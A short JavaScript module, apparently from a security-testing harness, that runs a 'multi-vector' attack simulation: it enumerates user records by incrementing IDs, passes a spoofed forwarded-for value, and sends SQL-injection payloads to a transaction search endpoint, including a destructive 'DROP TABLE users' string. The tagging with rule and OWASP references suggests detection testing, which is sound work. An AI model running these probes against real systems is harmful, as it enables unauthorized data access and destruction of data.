const { authedGet, sleep } = require('../lib/httpClient');


async function runEnumerationPhase(baseUrl, token, startId, forwardedFor) {
  const observations = [];
  for (let id = startId; id < startId + 3; id++) {
    observations.push(await authedGet(`${baseUrl}/api/users/${id}`, token, forwardedFor));
  }
  return observations;
}

async function runInjectionPhase(baseUrl, token, forwardedFor, payload = "' OR '1'='1") {
  const url = `${baseUrl}/api/transactions/search?q=${encodeURIComponent(payload)}`;
  return [await authedGet(url, token, forwardedFor)];
}

async function runMultiVector(baseUrl, token, startId, { forwardedFor, escalate = false } = {}) {
  const observations = [];
  observations.push(...(await runEnumerationPhase(baseUrl, token, startId, forwardedFor)));
  await sleep(100);
  observations.push(...(await runInjectionPhase(baseUrl, token, forwardedFor, "' OR '1'='1")));
  if (escalate) {
    await sleep(100);
    observations.push(...(await runInjectionPhase(baseUrl, token, forwardedFor, "x; DROP TABLE users--")));
  }
  return { category: 'multi_vector', ruleRef: 'R1+R5', owaspRef: 'multiple', observations };
}

module.exports = { runEnumerationPhase, runInjectionPhase, runMultiVector };
